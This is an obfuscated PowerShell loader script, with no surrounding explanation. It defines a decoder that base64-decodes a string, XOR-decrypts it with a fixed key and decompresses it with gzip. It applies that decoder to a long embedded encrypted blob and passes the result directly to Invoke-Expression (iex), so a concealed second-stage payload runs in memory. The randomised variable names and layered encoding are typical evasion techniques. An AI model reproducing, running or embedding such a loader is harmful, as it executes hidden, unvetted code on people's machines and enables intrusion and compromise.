$h7xf2ik5tjz83ce = [System.Text.Encoding]::ascii
function rf8vchp0jdg5stu719ae326zkyi  {param($dcpkae3fz7120b5 )
  $f9tugdpw6nr3kce = [System.Convert]::FromBase64String($dcpkae3fz7120b5)
  $htc53627x0lsaif= $h7xf2ik5tjz83ce.GetBytes("6249yz1olfn8")
    $he81xbjlkc59vrw = $f9tugdpw6nr3kce
    $m28sqik01hcedn6 = $(for ($8alv6cs9413uhpd = 0; $8alv6cs9413uhpd -lt $he81xbjlkc59vrw.length; ) {
        for ($mks1a352yinbd6t = 0; $mks1a352yinbd6t -lt $htc53627x0lsaif.length; $mks1a352yinbd6t++) {
            $he81xbjlkc59vrw[$8alv6cs9413uhpd] -bxor $htc53627x0lsaif[$mks1a352yinbd6t]
            $8alv6cs9413uhpd++
            if ($8alv6cs9413uhpd -ge $he81xbjlkc59vrw.Length) {
                $mks1a352yinbd6t = $htc53627x0lsaif.length
            }
        }
    })
	$u8a62p037fs9mzi = New-Object System.IO.MemoryStream( , $m28sqik01hcedn6 )

	    $qfku0gmy9jvhw2c = New-Object System.IO.MemoryStream
        $ws437r1um86nd5g = New-Object System.IO.Compression.GzipStream $u8a62p037fs9mzi, ([IO.Compression.CompressionMode]::Decompress)
	    $ws437r1um86nd5g.CopyTo( $qfku0gmy9jvhw2c )
        $ws437r1um86nd5g.Close()
		$u8a62p037fs9mzi.Close()
		[byte[]] $6ig8l3nd7h104zf = $qfku0gmy9jvhw2c.ToArray()
 $h2p57f148tenczr=$6ig8l3nd7h104zf
    return $h2p57f148tenczr
}
[byte[]]$6kumgfdvoz8q9t2=rf8vchp0jdg5stu719ae326zkyi $sr120e6iy7aqnwp
[System.Text.Encoding]::ascii.GetString((rf8vchp0jdg5stu719ae326zkyi "Kbk8OXl6MW9oZuNt7UCXAWkHb8WUYfuym9LBeZgxjR4+H94FEsNapbS/hFzX+LqsOjAguhn+wQpemJlRGHwoBXb7Gy/BsIfrkWl2bC3CjONX9KskkxzH31UJAuvyM2v5oyJ1GySJy12fuwrt1ZCHSZF9lSo4YN/jHo+ArYEj0XwY6Ag3rWbm8eWohFsBiKoW1czX0FAzLKmgLUS/LXtnJP62xJMMqEdW0iZGLZ9bjK0pYJO+Bnl75TTK9eLmKn+ScNcJGGbeMeTSlXX9SnuxPfZxICgv9LxmgUCdmk7QNdhX6DR4eWjfwCrCQeGXLd9CSfQz6WxaIvZz9kA4X4gjMumateun+P3OjZ96L11U/TcLjq5SssC0tGAo36SMalvoqFYRU80yassfurAICEVPizvXamS4zPQXXkebX4p3z8AY/7vBCBBXh39YCp81e5qJMGpv5hXErED2gy4rqSxeSyQeQK/UbhwQfB/NjhLMnqyGFTVM2blNluOV3KWx9MQnwK228zWKJj85v8RXwdmsnuv+kMVQ8X3DQTuXE+Na7ZqiEwoE874XZM6sLKRYh7dXlhTmqMyUh52dlw4P2CfXBhiGMm49hXAo1DotmkGZI9q2boKHldWtKmmLmRKxUD6ZtNQRfX+SLQT4SSFxpIpwq1YfTcNGt6xdZs320M647mZ1g/yrvqwrlPtCpCihRf2W36OeMWO/egVcNn4tRmFPS4KfPlwlPavqpnu8ahmXE1vdn/MdDq1qMCES1eckjUOK/sXoXIWH1TQz0MVOBpVFnEYqTu9whz6odjQtjgB0CWDs958XPwFOufj2bFI92NlLmznxJM4wPtHljXTre3CleKvud5wc5R7tJ9FL2XHwIy6/cuRQaIKkn7x2Dzz5PwPOSaRM2Xn3UsDJRuCk8C2tmff29ClDDxB4oyCMOHkSbtW+x17eBGXya440Crh25aFTK0LtCK39NxGRf46HcFEKUCCs1aGSHlfUaG44/6+P+9bQlJHDCoiHpKLd9AuMPbnOy68BhzZFbpbH2YMfzfQqY+q7+4ayaqmvzscIbuxebz79YFo0J5UfWnXOXyrwpseE72c02uV9jf8dZaIogOU9KjmukDg8vvna1s7uTLskF5bJTA2GuiXgwW3LeJoPr6v1EicxkXCZIWXoWF/mX00xN3eSbypwbyQcIkIUxVV46QRqm5qTZteyEk9dGhiIPwfCP6YJo+slNm9s"))|iex;